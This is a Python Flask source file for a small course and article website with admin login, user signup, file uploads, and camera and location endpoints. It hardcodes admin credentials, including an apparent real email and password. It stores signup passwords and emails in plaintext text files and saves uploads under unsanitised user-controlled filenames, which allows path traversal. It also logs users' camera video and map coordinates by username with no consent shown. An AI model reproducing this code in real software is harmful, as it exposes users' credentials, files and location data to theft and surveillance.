from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Admin credentials
ADMIN_USERNAME = 'RAJ ARYAN'
ADMIN_PASSWORD = 'raj@12345_aryan'
ADMIN_EMAIL = 'ra5338446@gmail.com'

# File upload directories
UPLOAD_FOLDER_COURSES = 'static/uploads/courses/'
UPLOAD_FOLDER_ARTICLES = 'static/uploads/articles/'
UPLOAD_FOLDER_CAMERA = 'data/camera/'

app.config['UPLOAD_FOLDER_COURSES'] = UPLOAD_FOLDER_COURSES
app.config['UPLOAD_FOLDER_ARTICLES'] = UPLOAD_FOLDER_ARTICLES
app.config['UPLOAD_FOLDER_CAMERA'] = UPLOAD_FOLDER_CAMERA

# Ensure upload directories exist
os.makedirs(UPLOAD_FOLDER_COURSES, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_ARTICLES, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_CAMERA, exist_ok=True)

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/courses')
def courses():
    files = os.listdir(UPLOAD_FOLDER_COURSES)
    return render_template('courses.html', files=files)

@app.route('/articles')
def articles():
    files = os.listdir(UPLOAD_FOLDER_ARTICLES)
    return render_template('articles.html', files=files)

@app.route('/about')
def about():
    with open('data/about.txt', 'r') as file:
        about_text = file.read()
    return render_template('about.html', about_text=about_text)

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        email = request.form['email']
        message = request.form['message']
        with open('data/contact.txt', 'a') as file:
            file.write(f'Email: {email}\nMessage: {message}\n\n')
        return redirect(url_for('signup'))
    return render_template('contact.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('home'))
    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        with open('data/username.txt', 'a') as file:
            file.write(f'{username}\n')
        with open('data/password.txt', 'a') as file:
            file.write(f'{password}\n')
        with open('data/email.txt', 'a') as file:
            file.write(f'{email}\n')
        session['logged_in'] = True
        session['username'] = username
        return redirect(url_for('home'))
    return render_template('signup.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('home'))

@app.route('/settings')
def settings():
    return render_template('settings.html')

@app.route('/upload_course', methods=['POST'])
def upload_course():
    if 'logged_in' not in session or session['username'] != ADMIN_USERNAME:
        return redirect(url_for('home'))
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and file.filename.endswith('.mp4'):
        filename = file.filename
        file.save(os.path.join(app.config['UPLOAD_FOLDER_COURSES'], filename))
        return redirect(url_for('courses'))
    return redirect(request.url)

@app.route('/upload_article', methods=['POST'])
def upload_article():
    if 'logged_in' not in session or session['username'] != ADMIN_USERNAME:
        return redirect(url_for('home'))
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and file.filename.endswith('.pdf'):
        filename = file.filename
        file.save(os.path.join(app.config['UPLOAD_FOLDER_ARTICLES'], filename))
        return redirect(url_for('articles'))
    return redirect(request.url)

@app.route('/view_video/<filename>')
def view_video(filename):
    return send_from_directory(UPLOAD_FOLDER_COURSES, filename)

@app.route('/view_pdf/<filename>')
def view_pdf(filename):
    return send_from_directory(UPLOAD_FOLDER_ARTICLES, filename)

@app.route('/camera', methods=['POST'])
def camera():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and file.filename.endswith('.mp4'):
        username = session.get('username')
        if username:
            filename = f"{username}.mp4"
            file.save(os.path.join(app.config['UPLOAD_FOLDER_CAMERA'], filename))
            return 'Video saved successfully'
        else:
            return 'Username not found in session', 400
    return redirect(request.url)

@app.route('/location')
def location():
    # Request location access and save to file
    latitude = request.args.get('latitude')
    longitude = request.args.get('longitude')
    with open('data/location.txt', 'a') as file:
        file.write(f'{session.get("username")}: https://www.google.com/maps/@{latitude},{longitude},15z\n')
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)